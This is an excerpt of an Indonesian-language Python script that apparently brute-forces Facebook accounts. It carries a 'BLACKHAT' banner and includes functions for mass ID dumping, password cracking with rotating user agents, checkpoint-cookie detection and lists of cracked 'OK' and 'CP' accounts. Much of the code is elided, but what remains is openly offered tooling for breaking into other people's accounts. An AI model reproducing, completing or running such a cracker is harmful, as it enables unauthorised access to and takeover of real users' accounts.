...
def banner():
	clear()
	wel = '# NO SYSTEM IS SAFE'
	wel2 = mark(wel, style='cyan')
	sol().print(wel2)
	au='_________________  _________  ____  __. |\n\____    /\      \ \_   ___ \|    |/ _| |[•]Au : FRAN.JASON\n  /     / /   |   \/    \  \/|      <   |[•]Nc : F.R.J\n /     /_/    |    \     \___|    |  \  |[•]Mg : SEBAYANG\n/_______ \____|__  /\______  /____|__ \ |[•]Tm : WHOAMI\n        \/       \/        \/        \/ |'
	pengembang1=nel(au,style="cyan")
	cetak(nel(pengembang1, title='BLACKHAT'))
...
def menu(my_name,my_id,my_birthday):
	...
	banner()
	sg = '# INFORMASI USER'
	fx = mark(sg, style='blue')
	sol().print(fx)
	print(x+'['+h+'•'+x+'] \033[93mNama Anda        : '+str(my_name))
	print(x+'['+h+'•'+x+'] \033[93mID Anda      : '+str(my_id))
	...
	if jh in ['1','01']:
		...
		print(x+'['+h+'•'+x+'] Tunggu ...')
		time.sleep(1)
		sw = '# FRAN JASON SEBAYANG'
		sol().print(mark(sw, style='blue'))
		exit()
	else:
		ric = '# PILIH YANG BENAR!!'
		sol().print(mark(ric, style='purple'))
		exit()

# RESULT CHECKER
def result():
	cek = '# CEK RESULT CRACK'
	sol().print(mark(cek, style='blue'))
	...
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
			...
			sol().print(mark(gada, style='purple'))
			time.sleep(2)
			back()
		if len(vin)==0:
			...
			gerr = '# HASIL CP ANDA'
			sol().print(mark(gerr, style='blue'))
			cih = 0
			lol = {}
			for isi in vin:
			...
			sol().print(mark(gerr2, style='blue'))
			...
			try:lin = open('CP/'+geh,'r').read()
				...
				sol().print(mark(hehe, style='purple'))
				time.sleep(2)
				back()
			akun = '# LIST AKUN CP ANDA'
			sol().print(mark(akun, style='blue'))
...
def file():
	...
	if len(my_files)==0:
		...
		sol().print(mark(yy, style='purple'))
		exit()
	else:
		cih = 0
		lol = {}
		...
		sol().print(mark(teks2, style='blue'))
		geeh = input(x+'['+p+'f'+x+'] Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			ric = '# PILIHAN TIDAK ADA DI MENU'
...
def dump_massal():
	...
	try:
		...
		pesan2 = mark(pesan, style='purple')
		sol().print(pesan2)
		exit()
	if jum<1 or jum>10:
...
def passwrd():
	...
	sol().print(mark(tanya, style='blue'))
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='JASON OK'))
					break
...
def crack3(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%sJASON %s/%s -|- OK:%s -|- CP:%s -|- %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
...
def cek_opsi():
	...
	for kes in akun:
		try:
			...
			print('')
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			sol().print(mark(li, style='purple'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='blue'))
	exit()
